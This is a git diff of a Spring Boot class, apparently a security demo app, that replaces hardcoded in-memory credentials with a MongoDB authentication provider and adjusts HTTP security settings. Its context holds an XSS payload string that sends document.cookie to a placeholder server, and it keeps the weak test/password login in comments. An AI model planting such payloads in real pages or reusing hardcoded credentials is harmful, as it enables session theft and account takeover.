@@ -45,6 +45,9 @@ public class UiApplication {
     @Autowired
     DemoUserRepository users;
 
+    @Autowired
+    private MongoDBAuthenticationProvider authenticationProvider;
+
     private String xssInputData = new String(
         "<p> <input type='button' name='Redirect' class='btn btn-primary' value='Submit' "
             + "onclick='<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>' /></p>");
@@ -100,9 +103,19 @@ public class UiApplication {
     //        customers.save(new Customer("John", "Smith"));
     //    }
 
+    //    @Autowired
+    //    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
+    //        auth.inMemoryAuthentication().withUser("test").password("password").roles("USER");
+    //    }
+
     @Autowired
     public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
-        auth.inMemoryAuthentication().withUser("test").password("password").roles("USER");
+        //StandardPasswordEncoder encoder = new StandardPasswordEncoder();
+        //users.deleteAll();
+        //SimpleGrantedAuthority role = new SimpleGrantedAuthority("USER");
+        //users.save(new DemoUser("test", encoder.encode("password"), true, Arrays.asList(role)));
+
+        auth.authenticationProvider(authenticationProvider);
     }
 
     @Configuration
@@ -122,7 +135,9 @@ public class UiApplication {
             //http.csrf().disable();
 
             http.headers().httpStrictTransportSecurity();
-            http.httpBasic().and().authorizeRequests().antMatchers(patterns).permitAll().anyRequest().authenticated();
+            //http.formLogin().defaultSuccessUrl("/").and().logout().and().authorizeRequests().
+            http.httpBasic().and().authorizeRequests().
+                antMatchers(patterns).permitAll().anyRequest().authenticated();
             http.csrf().and().addFilterAfter(new CsrfGrantingFilter(), SessionManagementFilter.class);
 
             //http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
